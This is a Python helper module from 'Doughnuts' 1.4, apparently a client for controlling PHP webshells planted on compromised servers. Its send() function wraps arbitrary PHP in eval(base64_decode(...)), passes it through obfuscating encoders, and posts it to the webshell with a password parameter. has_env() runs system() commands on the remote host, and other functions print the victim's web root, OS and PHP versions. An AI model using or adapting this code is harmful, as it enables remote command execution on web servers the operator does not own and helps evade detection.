import json
import subprocess
from base64 import b64encode
from os import popen
from random import randint, sample
from string import ascii_letters, digits

import requests

from libs.config import color, gget, is_windows


def banner():
    logo_choose = randint(1, 3)
    if logo_choose == 1:
        print(
            r"""
  _____                    _                 _
 |  __ \                  | |               | |
 | |  | | ___  _   _  __ _| |__  _ __  _   _| |_ ___
 | |  | |/ _ \| | | |/ _` | '_ \| '_ \| | | | __/ __|
 | |__| | (_) | |_| | (_| | | | | | | | |_| | |_\__ \
 |_____/ \___/ \__,_|\__, |_| |_|_| |_|\__,_|\__|___/
                      __/ |
                     |___/

 """
        )
    if logo_choose == 2:
        print(
            r"""
    ____                    __                __
   / __ \____  __  ______ _/ /_  ____  __  __/ /______
  / / / / __ \/ / / / __ `/ __ \/ __ \/ / / / __/ ___/
 / /_/ / /_/ / /_/ / /_/ / / / / / / / /_/ / /_(__  )
/_____/\____/\__,_/\__, /_/ /_/_/ /_/\__,_/\__/____/
                  /____/

"""
        )
    if logo_choose == 3:
        print(
            r"""
'########:::'#######::'##::::'##::'######:::'##::::'##:'##::: ##:'##::::'##:'########::'######::
 ##.... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
 ##:::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
 ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
 ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
 ########::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
........::::.......::::.......::::......::::..:::::..::..::::..:::.......::::::..::::::......:::

"""
        )
    print(color.green("Doughnut Version: 1.4\n"))


def base64_encode(data: str):
    return b64encode(data.encode()).decode()


def send(data: str, **extra_params):
    def randstr():
        return ''.join(sample(ascii_letters + digits, 8))
    url = gget("url", "webshell")
    params_dict = gget("webshell.params_dict", "webshell")
    password = gget("webshell.password", "webshell")
    raw_key = gget("webshell.method", "webshell")
    encode_functions = gget("webshell.encode_functions", "webshell")
    encode_pf = gget("encode.pf")
    params_dict.update(extra_params)
    if "data" not in params_dict:
        params_dict["data"] = {}
    head = randstr()
    tail = randstr()
    data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
    for func in encode_functions:
        if func in encode_pf:
            data = encode_pf[func].run(data)
    params_dict[raw_key][password] = data
    req = requests.post(url, **params_dict)
    # req.encoding = req.apparent_encoding
    text = req.text
    content = req.content
    req.r_text = text[text.find(head) + 8: text.find(tail)]
    req.r_content = content[content.find(bytes(head, 'utf-8')) + 8: content.find(bytes(tail, 'utf-8'))]
    try:
        req.r_json = json.loads(req.r_text)
    except json.JSONDecodeError:
        req.r_json = ''
    if 0:  # DEBUG
        print(f"[debug] {params_dict}")
        print(f"[debug] [{req}] {text}")
    return req


def delay_send(time: float, data: str):
    from time import sleep
    sleep(time)
    send(data)


def print_webshell_info():
    info = (
        gget("webshell.root", "webshell"),
        gget("webshell.os_version", "webshell"),
        gget("webshell.php_version", "webshell"),
    )
    info_name = ["Web root:", "OS version:", "PHP version:"]
    for name, info in zip(info_name, info):
        print(name + "\n    " + info + "\n")


def has_env(env: str, remote: bool = True):
    if is_windows(remote):
        command = "where"
    else:
        command = "whereis"
    if (remote):
        flag = send(f"system('{command} {env}');").r_text
    else:
        flag = popen(f"{command} {env}").read()
    return len(flag)


def open_editor(file_path: str):
    editor = "notepad.exe" if has_env("notepad.exe", False) else "vi"
    try:
        p = subprocess.Popen([editor, file_path], shell=False)
        p.wait()
        return True
    except FileNotFoundError:
        return False


def print_tree(origin_path: str, tree: dict, depth: int = 0):
    if depth:
        if not origin_path.isdigit() and tree:
            origin_path = color.blue(origin_path)
            if depth == 1:
                print("├──" + origin_path)
            else:
                print("│" + "  │" * (depth - 1) + "  " + "├─" + origin_path)
        else:
            depth -= 1

    else:
        print(origin_path)
    if isinstance(tree, dict):
        for k, v in tree.items():
            print_tree(k, v, depth + 1)
    if isinstance(tree, str):
        tree = [tree]
    if isinstance(tree, list):
        if not depth:
            new_tree = ["├─" + file.split("/")[-1] for file in tree]
            print("\n".join(new_tree))
        else:
            new_tree = [
                "│" + "  │" * (depth - 1) + "  " + "├─" + file.split("/")[-1]
                for file in tree
            ]
            print("\n".join(new_tree))
